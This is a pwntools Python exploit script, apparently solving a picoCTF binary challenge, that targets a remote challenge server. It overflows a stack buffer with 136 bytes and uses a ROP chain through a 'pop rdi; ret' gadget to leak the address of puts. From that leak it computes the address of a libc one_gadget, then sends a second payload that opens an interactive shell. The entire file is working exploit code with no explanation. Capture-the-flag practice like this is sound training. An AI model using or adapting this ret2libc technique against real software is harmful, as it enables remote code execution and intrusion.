from pwn import *

elf = ELF("./attachment/vuln")
rop = ROP(elf)
libc = ELF("./attachment/given_libc.so.6")

# io = process(elf.path, cwd="./attachment", level="DEBUG")
io = remote("mercury.picoctf.net", 49464, level="DEBUG")

io.recvline()

payload = b"".join([
    b"A" * 136, p64(0x0000000000400913),  # pop rdi; ret 
    p64(elf.got.puts), p64(elf.plt.puts), p64(elf.symbols.main),
])

io.sendline(payload)

io.recvuntil(b"d\n")
puts_address = unpack(io.recv(6) + b"\x00\x00", 64)
one_gadget_address = puts_address + 0x4f3c2 - libc.symbols.puts
# gdb.attach(io, f"b *{hex(one_gadget_address)}")
payload = b"".join([b"A" * 136, p64(one_gadget_address), b"\x00" * 0x48])
io.sendline(payload)
io.recv()
io.interactive()